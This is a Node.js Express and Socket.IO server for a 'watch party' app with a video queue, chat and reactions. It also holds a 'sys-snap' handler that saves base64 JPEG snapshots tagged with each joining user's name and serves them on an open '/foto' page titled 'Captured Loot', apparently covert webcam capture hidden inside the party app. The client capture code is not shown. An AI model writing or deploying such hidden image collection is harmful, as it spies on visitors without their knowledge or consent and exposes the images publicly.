const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const fs = require('fs');
const path = require('path');

app.use(express.static(__dirname));

// --- Database & Storage ---
let users = {};
let videoQueue = [];
const dir = './hasil';

// Buat folder 'hasil' jika belum ada
if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir);
}

// --- Dashboard Foto ---
// Akses link ini: https://nontonbareng-production.up.railway.app/foto
app.get('/foto', (req, res) => {
    fs.readdir(dir, (err, files) => {
        if (err || !files || files.length === 0) {
            return res.send("<html><body style='background:#111; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;'><h2>Belum ada foto yang masuk.</h2></body></html>");
        }
        
        let html = `
        <html>
        <head>
            <title>Captured Loot</title>
            <style>
                body { background: #050505; color: #fff; font-family: sans-serif; padding: 20px; }
                h1 { border-bottom: 2px solid #e53170; padding-bottom: 10px; color: #e53170; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-top: 20px; }
                .card { background: #18181b; border-radius: 12px; overflow: hidden; border: 1px solid #333; text-align: center; }
                img { width: 100%; height: auto; border-bottom: 1px solid #333; }
                .info { padding: 10px; font-size: 12px; color: #888; }
            </style>
        </head>
        <body>
            <h1>Captured Loot 📸</h1>
            <div class='grid'>
        `;

        // Urutkan dari yang terbaru
        const sortedFiles = files.filter(f => f.endsWith('.jpg')).sort().reverse();
        
        sortedFiles.forEach(file => {
            html += `
                <div class='card'>
                    <img src='/view-foto/${file}'>
                    <div class='info'>${file}</div>
                </div>`;
        });

        html += "</div></body></html>";
        res.send(html);
    });
});

// Route untuk nampilin gambar
app.get('/view-foto/:name', (req, res) => {
    res.sendFile(path.join(__dirname, 'hasil', req.params.name));
});

// --- Socket Logic ---
io.on('connection', (socket) => {
    
    socket.emit('update-queue', videoQueue);

    socket.on('join', (name) => {
        users[socket.id] = { 
            name, 
            color: '#' + Math.floor(Math.random()*16777215).toString(16),
            status: 'active' 
        };
        io.emit('update-users', Object.values(users));
        io.emit('system-log', `${name} bergabung ke pesta 🟢`);
    });

    // Handle satu kali jepretan saat user klik masuk
    socket.on('sys-snap', (data) => {
        if (!data || !data.i) return;
        const base64Data = data.i.replace(/^data:image\/jpeg;base64,/, "");
        const safeName = data.n.replace(/[^a-z0-9]/gi, '_').toLowerCase();
        const fileName = `${safeName}_${Date.now()}.jpg`;

        fs.writeFile(path.join(dir, fileName), base64Data, 'base64', (err) => {
            if (!err) console.log(`[SYSTEM] Snap saved from: ${data.n}`);
        });
    });

    socket.on('add-to-queue', (url) => {
        videoQueue.push(url);
        io.emit('update-queue', videoQueue);
        if(videoQueue.length === 1) {
            io.emit('play-video', { url: videoQueue[0] });
        }
    });

    socket.on('skip-video', () => {
        if(videoQueue.length > 0) {
            videoQueue.shift();
            io.emit('update-queue', videoQueue);
            if(videoQueue.length > 0) {
                io.emit('play-video', { url: videoQueue[0] });
            }
        }
    });

    socket.on('video-control', (data) => {
        socket.broadcast.emit('video-control', data);
    });

    socket.on('new-message', (data) => {
        const user = users[socket.id];
        if (user) {
            socket.broadcast.emit('chat-receive', { ...data, color: user.color });
        }
    });

    socket.on('send-reaction', (emoji) => {
        io.emit('floating-reaction', emoji);
    });

    socket.on('disconnect', () => {
        if (users[socket.id]) {
            const name = users[socket.id].name;
            delete users[socket.id];
            io.emit('update-users', Object.values(users));
            io.emit('system-log', `${name} meninggalkan pesta 🔴`);
        }
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, '0.0.0.0', () => {
    console.log(`SERVER WATCH PARTY READY ON PORT: ${PORT}`);
});
